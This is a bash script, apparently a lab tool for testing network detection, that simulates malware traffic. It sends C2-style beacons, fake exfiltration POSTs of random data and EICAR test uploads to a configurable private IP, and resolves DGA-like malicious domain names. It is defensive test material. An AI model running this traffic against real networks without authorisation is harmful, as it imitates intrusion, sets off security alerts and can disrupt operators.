#!/bin/bash
# Malware Simulator
# Simulates various malware behaviors for network security testing
# Version: 1.0

set +e

LOG_FILE="/app/logs/malware.log"
CONTAINER_IP=$(hostname -I | awk '{print $1}')

# Default configuration
TARGET_IP="${TARGET_IP:-192.168.6.131}"
TARGET_PORT="${TARGET_PORT:-5000}"
C2_INTERVAL="${C2_BEACON_INTERVAL:-15}"
EXFIL_INTERVAL="${EXFIL_INTERVAL:-25}"
EICAR_INTERVAL="${EICAR_INTERVAL:-40}"
DNS_INTERVAL="${DNS_ATTACK_INTERVAL:-20}"

log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# C2 Beacon Simulation
c2_beacon() {
    while true; do
        local beacon_data="{\"type\":\"beacon\",\"host\":\"$CONTAINER_IP\",\"timestamp\":\"$(date -u +%s)\"}"
        
        if curl -s -X POST \
            -H "Content-Type: application/json" \
            -H "X-C2-Session: $(uuidgen)" \
            -d "$beacon_data" \
            "http://${TARGET_IP}:${TARGET_PORT}/api/device/data" >/dev/null 2>&1; then
            log_message "[C2] Beacon sent successfully"
        else
            log_message "[C2] Beacon failed"
        fi
        
        sleep "$C2_INTERVAL"
    done
}

# Data Exfiltration Simulation
data_exfiltration() {
    local counter=1
    
    while true; do
        local data_size=$((RANDOM % 5000 + 1000))
        local exfil_data=$(head -c "$data_size" </dev/urandom | base64 -w 0 | head -c "$data_size")
        
        local payload="{\"type\":\"exfil\",\"data\":\"$exfil_data\",\"size\":$data_size,\"seq\":$counter}"
        
        if curl -s -X POST \
            -H "Content-Type: application/json" \
            -H "X-Exfil-Session: $(uuidgen)" \
            -d "$payload" \
            "http://${TARGET_IP}:${TARGET_PORT}/api/device/data" >/dev/null 2>&1; then
            log_message "[EXFIL] Sent $data_size bytes (seq: $counter)"
        else
            log_message "[EXFIL] Failed to send data"
        fi
        
        counter=$((counter + 1))
        sleep "$EXFIL_INTERVAL"
    done
}

# EICAR Test File Upload
eicar_upload() {
    local eicar_string='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
    local counter=1
    
    while true; do
        local filename="malware_sample_${counter}_$(date +%s).exe"
        
        local payload="{\"type\":\"file_upload\",\"filename\":\"$filename\",\"content\":\"$eicar_string\",\"size\":${#eicar_string}}"
        
        if curl -s -X POST \
            -H "Content-Type: application/json" \
            -H "X-Malware-Upload: true" \
            -d "$payload" \
            "http://${TARGET_IP}:${TARGET_PORT}/api/device/data" >/dev/null 2>&1; then
            log_message "[EICAR] Uploaded test file: $filename"
        else
            log_message "[EICAR] Upload failed"
        fi
        
        counter=$((counter + 1))
        sleep "$EICAR_INTERVAL"
    done
}

# DNS NXDOMAIN / DGA Simulation
dns_attacks() {
    local domains=(
        "malicious-c2-server-$(uuidgen | cut -d'-' -f1).com"
        "botnet-command-$(uuidgen | cut -d'-' -f1).net"
        "phishing-site-$(uuidgen | cut -d'-' -f1).org"
        "ransomware-c2-$(uuidgen | cut -d'-' -f1).ru"
    )
    
    while true; do
        for domain in "${domains[@]}"; do
            nslookup "$domain" >/dev/null 2>&1 || true
            log_message "[DNS] NXDOMAIN query: $domain"
        done
        
        sleep "$DNS_INTERVAL"
    done
}

cleanup() {
    log_message "Stopping malware simulator"
    jobs -p | xargs -r kill 2>/dev/null || true
    exit 0
}

trap cleanup SIGTERM SIGINT

# Main execution
log_message "========================================="
log_message "Malware Simulator Started"
log_message "Container IP: $CONTAINER_IP"
log_message "Target: $TARGET_IP:$TARGET_PORT"
log_message "========================================="

# Start all behaviors in background
c2_beacon &
log_message "C2 Beacon started (interval: ${C2_INTERVAL}s)"

data_exfiltration &
log_message "Data Exfiltration started (interval: ${EXFIL_INTERVAL}s)"

eicar_upload &
log_message "EICAR Upload started (interval: ${EICAR_INTERVAL}s)"

dns_attacks &
log_message "DNS Attacks started (interval: ${DNS_INTERVAL}s)"

log_message "All behaviors running"
log_message "========================================="

# Keep running
while true; do
    sleep 60
    log_message "Status: All behaviors active"
done
